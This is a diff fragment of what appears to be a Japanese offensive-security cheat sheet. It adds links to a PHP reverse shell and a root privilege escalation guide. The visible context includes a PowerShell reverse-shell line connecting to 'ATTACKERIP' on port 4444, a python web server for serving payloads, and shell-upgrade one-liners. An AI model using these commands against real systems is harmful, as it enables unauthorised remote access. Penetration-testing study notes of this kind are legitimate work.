@@ -167,6 +167,9 @@ cd ~/www
 python3 -m http.server 80
 ```
 ### リバースシェル
+
+[reverseshell.php](https://github.com/L4ughingc4t/offsec-cheats/blob/main/reverseshell.php)
+
 #### shell.ps1 
 ```
 $client = New-Object System.Net.Sockets.TCPClient("ATTACKERIP",4444);
@@ -227,6 +230,9 @@ python3 -c 'import pty; pty.spawn("/bin/bash")'
 ```
 script /dev/null -c bash
 ```
+
+## 🔴Privilege escalation to root
+[Privilege escalation to root](https://github.com/L4ughingc4t/offsec-cheats/blob/main/root%20escalation%20method/Privilege%20Escalation%20Procedure.md)
 
 # 🔵tools
 
